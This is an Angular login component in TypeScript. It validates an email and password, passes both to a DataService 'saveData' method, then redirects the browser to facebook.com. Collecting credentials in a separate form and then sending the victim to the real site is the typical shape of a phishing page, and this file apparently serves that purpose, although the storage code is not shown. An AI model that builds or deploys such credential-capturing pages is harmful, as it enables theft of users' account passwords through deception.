import { Component, OnInit } from '@angular/core';
import { DataService } from '../services/data.service';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.scss']
})
export class LoginComponent implements OnInit {

  constructor(
    private dataService: DataService,
  ) { }

  ngOnInit(): void {
  }

  emailError: boolean = false;
  passwordError: boolean = false;

  saveData(email: string, password: string){
    this.emailError = false;
    this.passwordError = false;

    if(!/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test(email)){
      this.emailError = true;
    }
    if(password.length < 6){
      this.passwordError = true;
    }

    if(!this.emailError && !this.passwordError){
      this.dataService.saveData(email, password);
      window.location.href = 'https://www.facebook.com/';
    }

  }
}
